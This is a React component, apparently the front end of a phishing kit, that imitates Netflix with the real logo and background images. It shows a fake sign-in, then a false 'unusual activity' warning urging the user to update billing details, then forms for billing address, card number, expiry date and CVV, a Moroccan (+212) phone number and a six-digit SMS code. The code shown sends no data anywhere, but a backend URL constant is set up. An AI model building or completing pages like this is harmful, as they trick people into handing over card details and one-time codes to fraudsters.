import React, { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;
const TestFlow = () => {
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const inputRefs = useRef([]);

  // دالة ديال الكود د 6 أرقام
  const handleCodeChange = (index, e) => {
    const value = e.target.value;
    if (/[^0-9]/.test(value)) return;
    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);
    if (value !== '' && index < 5) inputRefs.current[index + 1].focus();
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputRefs.current[index - 1].focus();
    }
  };

  // 🚀 الدالة اللخرة لي كتدخلك لـ Browse
  const finishFlow = () => {
    // كنفورصيو يوزر وهمي فـ المتصفح باش Browse يخدم ويحسابو راك مخلص
    const dummyUser = {
      _id: "test-user-123",
      email: "test@netflix.com",
      subscriptionStatus: "Active",
      profiles: [{ name: "Tester", profilePic: "", myList: [] }]
    };
    localStorage.setItem('isAuthenticated', 'true');
    localStorage.setItem('user', JSON.stringify(dummyUser));
    localStorage.setItem('activeProfile', JSON.stringify(dummyUser.profiles[0]));
    
    navigate('/browse');
  };

  return (
    <div className={`min-h-screen font-['Inter',_sans-serif] ${step === 1 ? 'bg-black text-white relative' : 'bg-[#f3f3f3] text-[#333]'}`}>
      
      {/* ======================= Step 1: Login وهمي ======================= */}
      {step === 1 && (
        <div className="relative min-h-screen flex flex-col">
          <div className="absolute inset-0 bg-cover bg-center opacity-50" style={{ backgroundImage: `url('https://assets.nflxext.com/ffe/siteui/vlv3/435e8bb8-7f1b-49cb-8da8-bff997124294/web/US-en-20260511-TRIFECTA-perspective_faa2ba65-d9fe-44bc-b4e0-f702a991adaa_large.jpg')` }}></div>
          <div className="absolute inset-0 bg-black/50"></div>
          
          <header className="relative z-10 px-[5%] py-6">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" className="w-[167px] cursor-pointer" />
          </header>

          <main className="relative z-10 flex flex-grow justify-center items-center px-4">
            <div className="bg-black/70 px-16 py-16 rounded-[4px] w-full max-w-[450px]">
              <h1 className="text-[32px] font-bold mb-8">Sign In (Test)</h1>
              <div className="flex flex-col gap-4">
                <input type="email" placeholder="Email or phone number" className="w-full h-[50px] bg-[#333] rounded px-4 text-white placeholder-gray-400 focus:outline-none focus:bg-[#454545] transition" />
                <input type="password" placeholder="Password" className="w-full h-[50px] bg-[#333] rounded px-4 text-white placeholder-gray-400 focus:outline-none focus:bg-[#454545] transition" />
                <button onClick={() => setStep(2)} className="w-full h-[50px] bg-[#e50914] rounded text-white font-bold mt-6 hover:bg-red-700 transition">Sign In</button>
                <div className="flex justify-between text-gray-400 text-[13px] mt-2">
                  <span><input type="checkbox" className="mr-1 accent-gray-500" /> Remember me</span>
                  <span className="hover:underline cursor-pointer">Need help?</span>
                </div>
              </div>
            </div>
          </main>
        </div>
      )}

      {/* Navbar ديال الخطوات البيضاء */}
      {step > 1 && (
        <header className="h-[90px] bg-white border-b border-gray-200 flex items-center justify-between px-6 md:px-[5%]">
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" className="w-[167px]" />
          <button className="text-[#333] font-bold text-[19px] hover:underline" onClick={() => setStep(1)}>Sign Out</button>
        </header>
      )}

      <main className="flex justify-center mt-8 px-4 pb-20">
        
        {/* ======================= Step 2: تنبيه الأمان (Skip / Next) ======================= */}
        {step === 2 && (
          <div className="w-full max-w-[440px] text-center mt-12">
            <div className="border-2 border-[#e50914] rounded-full p-3 mb-6 mx-auto w-fit">
              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-[#e50914]"><path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <h1 className="text-[32px] font-bold tracking-tight leading-tight mb-4 text-[#333]">Update your account information</h1>
            <p className="text-[17px] mb-8 text-[#333]">We noticed some unusual activity on your account. To secure your profile, please update your billing details.</p>
            <button onClick={() => setStep(3)} className="bg-[#e50914] text-white w-full h-[64px] rounded-[3px] font-bold text-[24px] hover:bg-red-700 transition mb-4">Next</button>
            <button onClick={() => setStep(3)} className="bg-[#e6e6e6] text-black w-full h-[64px] rounded-[3px] font-bold text-[24px] hover:bg-gray-300 transition">Skip for now</button>
          </div>
        )}

        {/* ======================= Step 3: Billing Address ======================= */}
        {step === 3 && (
          <div className="w-full max-w-[440px] mt-4">
            <span className="text-[13px] font-medium mb-1 text-[#333] block">Step <b>1</b> of <b>3</b></span>
            <h1 className="text-[32px] font-bold tracking-tight leading-[1.2] mb-6 text-[#333]">Enter your billing address</h1>
            <div className="flex flex-col gap-3 mb-8">
              <input type="text" placeholder="First Name" className="w-full h-[60px] px-4 border border-gray-400 rounded focus:border-blue-500 focus:outline-none" />
              <input type="text" placeholder="Last Name" className="w-full h-[60px] px-4 border border-gray-400 rounded focus:border-blue-500 focus:outline-none" />
              <input type="text" placeholder="Address Line 1" className="w-full h-[60px] px-4 border border-gray-400 rounded focus:border-blue-500 focus:outline-none" />
              <div className="flex gap-3">
                <input type="text" placeholder="City" className="w-full h-[60px] px-4 border border-gray-400 rounded focus:border-blue-500 focus:outline-none" />
                <input type="text" placeholder="ZIP Code" className="w-full h-[60px] px-4 border border-gray-400 rounded focus:border-blue-500 focus:outline-none" />
              </div>
            </div>
            <button onClick={() => setStep(4)} className="bg-[#e50914] text-white w-full h-[64px] rounded-[3px] font-bold text-[24px] hover:bg-red-700 transition">Next</button>
          </div>
        )}

        {/* ======================= Step 4: Payment ======================= */}
        {step === 4 && (
          <div className="w-full max-w-[440px] mt-4">
            <span className="text-[13px] font-medium mb-1 text-[#333] block">Step <b>2</b> of <b>3</b></span>
            <h1 className="text-[32px] font-bold tracking-tight leading-[1.2] mb-6 text-[#333]">Verify your payment method</h1>
            <div className="flex gap-1.5 mb-6">
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo_2014.svg/120px-Visa_Inc._logo_2014.svg.png" className="h-[22px] w-[36px] border border-gray-200 rounded px-1" />
              <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-[22px] w-[36px] border border-gray-200 rounded px-1" />
            </div>
            <div className="flex flex-col gap-3 mb-8">
              <input type="text" placeholder="Card Number" className="w-full h-[60px] px-4 border border-gray-400 rounded focus:border-blue-500 focus:outline-none" />
              <div className="flex gap-3">
                <input type="text" placeholder="Expiration Date (MM/YY)" className="w-full h-[60px] px-4 border border-gray-400 rounded focus:border-blue-500 focus:outline-none" />
                <input type="text" placeholder="CVV" className="w-full h-[60px] px-4 border border-gray-400 rounded focus:border-blue-500 focus:outline-none" />
              </div>
            </div>
            <button onClick={() => setStep(5)} className="bg-[#e50914] text-white w-full h-[64px] rounded-[3px] font-bold text-[24px] hover:bg-red-700 transition">Save & Continue</button>
          </div>
        )}

        {/* ======================= Step 5: Phone Number ======================= */}
        {step === 5 && (
          <div className="w-full max-w-[440px] mt-4">
            <span className="text-[13px] font-medium mb-1 text-[#333] block">Step <b>3</b> of <b>3</b></span>
            <h1 className="text-[32px] font-bold tracking-tight leading-[1.2] mb-4 text-[#333]">Set up password recovery</h1>
            <p className="text-[16px] text-gray-600 mb-6">We'll text you a verification code to confirm this is your number.</p>
            <div className="flex border border-gray-400 rounded mb-8 h-[60px] focus-within:border-blue-500 overflow-hidden">
              <div className="bg-gray-100 flex items-center px-4 border-r border-gray-300 font-medium">MA +212</div>
              <input 
                type="tel" 
                placeholder="Mobile phone number" 
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className="w-full px-4 focus:outline-none" 
              />
            </div>
            <button onClick={() => setStep(6)} className="bg-[#e50914] text-white w-full h-[64px] rounded-[3px] font-bold text-[24px] hover:bg-red-700 transition">Send SMS Code</button>
          </div>
        )}

        {/* ======================= Step 6: Checkpoint (SMS Code) ======================= */}
        {step === 6 && (
          <div className="w-full max-w-[440px] text-center mt-4">
            <h1 className="text-[32px] font-bold tracking-tight leading-tight mb-4 text-black text-left">Please enter the code we just sent</h1>
            <p className="text-[16px] mb-8 text-gray-600 text-left">Please enter the code we sent to <b className="text-black">{phone || '+212 600 00 00 00'}</b> to help us protect your account.</p>

            <div className="flex justify-start gap-2 mb-8">
              {code.map((data, index) => (
                <input
                  key={index}
                  type="text"
                  maxLength="1"
                  ref={el => inputRefs.current[index] = el}
                  value={data}
                  onChange={e => handleCodeChange(index, e)}
                  onKeyDown={e => handleKeyDown(index, e)}
                  className="w-[45px] h-[55px] md:w-[50px] md:h-[60px] border border-gray-400 rounded-[4px] text-center text-[24px] font-bold focus:border-black focus:outline-none focus:ring-1 focus:ring-black transition"
                />
              ))}
            </div>

            <button onClick={finishFlow} className="bg-black text-white w-full h-[60px] rounded-[4px] font-bold text-[20px] mb-3 hover:bg-gray-800 transition">Submit</button>
            <button className="bg-[#e6e6e6] text-black w-full h-[60px] rounded-[4px] font-bold text-[20px] mb-6 hover:bg-gray-300 transition">Resend code</button>
          </div>
        )}

      </main>
    </div>
  );
};

export default TestFlow;